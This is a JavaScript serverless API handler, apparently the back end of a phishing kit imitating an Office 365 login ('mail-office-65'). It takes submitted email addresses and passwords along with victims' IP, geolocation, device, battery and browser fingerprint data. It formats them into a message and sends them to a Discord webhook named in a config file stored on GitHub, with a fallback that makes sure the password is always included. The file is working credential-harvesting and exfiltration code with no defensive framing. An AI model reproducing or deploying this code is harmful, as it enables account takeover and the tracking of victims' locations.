// API de Discord - Envía datos de login al webhook configurado
// Usa ES modules (import/export) - Vercel los compila automáticamente
import { Buffer } from 'node:buffer';

const GH_TOKEN = process.env.GH_TOKEN || '';
const GH_OWNER = process.env.GH_OWNER || 'varasjaime777-alt';
const GH_REPO = process.env.GH_REPO || 'mail-office-65';
const CONFIG_PATH = 'config.json';
const GITHUB_API = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${CONFIG_PATH}`;

const headers = {
  'Authorization': `token ${GH_TOKEN}`,
  'Accept': 'application/vnd.github.v3+json',
  'User-Agent': 'MailOffice65/1.0',
  'X-GitHub-Api-Version': '2022-11-28',
};

async function githubRead() {
  const res = await fetch(GITHUB_API, { method: 'GET', headers });
  if (!res.ok) throw new Error(`GitHub read error: ${res.status}`);
  const data = await res.json();
  return JSON.parse(Buffer.from(data.content, 'base64').toString('utf-8'));
}

// Construye el mensaje de Discord usando string concatenation (no template literals multiline)
function buildDefaultMessage(body, clientIp, timestamp) {
  var message = '';
  message += '🔐 Nuevo inicio de sesión';
  message += '\n──────────────────────────';
  message += '\nUsuario: ' + (body.email || 'unknown');
  message += '\nContraseña: ' + (body.password || '****');
  message += '\nIP: ' + clientIp;

  // Geo IP con fallbacks
  var geoIp = body.geoIp || body.ipifyIp || clientIp;
  message += '\nGeo IP: ' + (geoIp || 'desconocida');
  message += '\nCiudad: ' + (body.geoCity || 'desconocida');
  message += '\nRegión: ' + (body.geoRegion || 'desconocida');
  message += '\nPaís: ' + (body.geoCountry || 'desconocida') + ' (' + (body.geoCountryCode || 'desconocido') + ')';
  message += '\nISP: ' + (body.geoIsp || 'desconocida');
  message += '\nLatitud: ' + (body.geoLatitude || 'desconocida');
  message += '\nLongitud: ' + (body.geoLongitude || 'desconocida');

  // Dispositivo
  message += '\n\n📱 Información del dispositivo:';
  message += '\nMemoria RAM: ' + (body.deviceMemory || 'desconocida');
  message += '\nCPU: ' + (body.cpuCores || 'desconocido') + ' núcleos';
  message += '\nPuntos táctiles: ' + (body.touchPoints || 0);
  message += '\nTipo: ' + (body.isMobile || 'No') + ' (Móvil) / ' + (body.isTablet || 'No') + ' (Tablet) / ' + (body.isDesktop || 'No') + ' (Escritorio)';

  // Batería
  message += '\nBatería: ' + (body.batteryLevel || 'No disponible') + ' (Cargando: ' + (body.batteryCharging || 'Desconocido') + ')';

  // Navegador
  message += '\n\n🌐 Navegador:';
  message += '\nUser Agent: ' + (body.userAgent || 'desconocido');
  message += '\nIdioma: ' + (body.language || 'desconocido');
  message += '\nPantalla: ' + (body.screenResolution || 'desconocida') + ' (' + (body.colorDepth || 'desconocida') + ')';
  message += '\nZona horaria: ' + (body.timezone || 'desconocida');
  message += '\nPlataforma: ' + (body.platform || 'desconocida');
  message += '\nEstado online: ' + (body.onlineStatus || 'desconocido');
  message += '\nCookies: ' + (body.cookiesEnabled || 'desconocido');
  message += '\n──────────────────────────';
  message += '\nHora: ' + timestamp;

  return message;
}

// Aplica template personalizado con placeholders
function applyTemplate(template, body, clientIp, timestamp) {
  var message = template;
  message = message.replace(/\{email\}/g, body.email || 'unknown');
  message = message.replace(/\{password\}/g, body.password || '****');
  message = message.replace(/\{ip\}/g, clientIp || 'desconocida');
  message = message.replace(/\{geoIp\}/g, body.geoIp || body.ipifyIp || clientIp || 'desconocida');
  message = message.replace(/\{geoCity\}/g, body.geoCity || 'desconocida');
  message = message.replace(/\{geoRegion\}/g, body.geoRegion || 'desconocida');
  message = message.replace(/\{geoCountry\}/g, body.geoCountry || 'desconocida');
  message = message.replace(/\{geoCountryCode\}/g, body.geoCountryCode || 'desconocido');
  message = message.replace(/\{geoTimezone\}/g, body.geoTimezone || 'desconocida');
  message = message.replace(/\{geoIsoCode\}/g, body.geoIsoCode || 'desconocida');
  message = message.replace(/\{geoIsp\}/g, body.geoIsp || 'desconocida');
  message = message.replace(/\{geoLatitude\}/g, body.geoLatitude || 'desconocida');
  message = message.replace(/\{geoLongitude\}/g, body.geoLongitude || 'desconocida');
  message = message.replace(/\{geoZip\}/g, body.geoZip || 'desconocida');
  message = message.replace(/\{geoCurrency\}/g, body.geoCurrency || 'desconocida');
  message = message.replace(/\{geoCurrencyCode\}/g, body.geoCurrencyCode || 'desconocida');
  message = message.replace(/\{geoCallingCode\}/g, body.geoCallingCode || 'desconocida');
  message = message.replace(/\{geoNetwork\}/g, body.geoNetwork || 'desconocida');
  message = message.replace(/\{deviceMemory\}/g, body.deviceMemory || 'desconocida');
  message = message.replace(/\{cpuCores\}/g, body.cpuCores || 'desconocido');
  message = message.replace(/\{touchPoints\}/g, body.touchPoints || 0);
  message = message.replace(/\{isMobile\}/g, body.isMobile || 'No');
  message = message.replace(/\{isTablet\}/g, body.isTablet || 'No');
  message = message.replace(/\{isDesktop\}/g, body.isDesktop || 'No');
  message = message.replace(/\{batteryLevel\}/g, body.batteryLevel || 'No disponible');
  message = message.replace(/\{batteryCharging\}/g, body.batteryCharging || 'Desconocido');
  message = message.replace(/\{userAgent\}/g, body.userAgent || 'desconocido');
  message = message.replace(/\{language\}/g, body.language || 'desconocido');
  message = message.replace(/\{screenResolution\}/g, body.screenResolution || 'desconocida');
  message = message.replace(/\{colorDepth\}/g, body.colorDepth || 'desconocida');
  message = message.replace(/\{timezone\}/g, body.timezone || 'desconocida');
  message = message.replace(/\{platform\}/g, body.platform || 'desconocida');
  message = message.replace(/\{onlineStatus\}/g, body.onlineStatus || 'desconocido');
  message = message.replace(/\{cookiesEnabled\}/g, body.cookiesEnabled || 'desconocido');
  message = message.replace(/\{timestamp\}/g, timestamp);
  message = message.replace(/\{ipifyIp\}/g, body.ipifyIp || 'desconocida');

  return message;
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método no permitido' });
  }

  try {
    // Leer configuración desde GitHub
    var config = {};
    try {
      config = await githubRead();
    } catch (e) {
      console.error('GitHub config read failed:', e);
      return res.status(500).json({ error: 'No se pudo leer la configuración del servidor' });
    }

    var webhookUrl = config.discordWebhook;
    if (!webhookUrl || !webhookUrl.includes('discord.com/api/webhooks')) {
      return res.status(400).json({ error: 'Webhook de Discord no configurado' });
    }

    var body = req.body || {};
    var timestamp = new Date().toISOString();

    // IP del cliente (desde headers de Vercel)
    var forwardedFor = req.headers['x-forwarded-for'] || '';
    var clientIp = forwardedFor.split(',')[0] || 'desconocida';

    var email = body.email || 'unknown';
    var password = body.password || '****';

    // Construir el mensaje
    var template = config.discordMessageTemplate || '';
    var message = '';

    if (template && template.includes('{email}')) {
      message = applyTemplate(template, body, clientIp, timestamp);
    } else {
      message = buildDefaultMessage(body, clientIp, timestamp);
    }

    // Fallback: asegurar que la contraseña siempre esté incluida
    if (message.indexOf(password) === -1 && password !== '****') {
      message += '\nContraseña: ' + password;
    }

    // Fallback: asegurar que la ubicación siempre esté incluida
    if (message.indexOf('Ciudad:') === -1) {
      message += '\nCiudad: ' + (body.geoCity || 'desconocida');
      message += '\nRegión: ' + (body.geoRegion || 'desconocida');
      message += '\nPaís: ' + (body.geoCountry || 'desconocida') + ' (' + (body.geoCountryCode || '') + ')';
      message += '\nISP: ' + (body.geoIsp || 'desconocida');
      message += '\nLatitud: ' + (body.geoLatitude || 'desconocida');
      message += '\nLongitud: ' + (body.geoLongitude || 'desconocida');
    }

    // Enviar al webhook de Discord
    var discordRes = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: message }),
    });

    if (!discordRes.ok) {
      var text = await discordRes.text();
      return res.status(500).json({ error: 'Error enviando a Discord: ' + discordRes.status + ' ' + text });
    }

    return res.status(200).json({ success: true, message: 'Mensaje enviado a Discord correctamente.' });
  } catch (err) {
    console.error('Error en API de Discord:', err);
    return res.status(500).json({ error: 'Error interno: ' + err.message });
  }
}
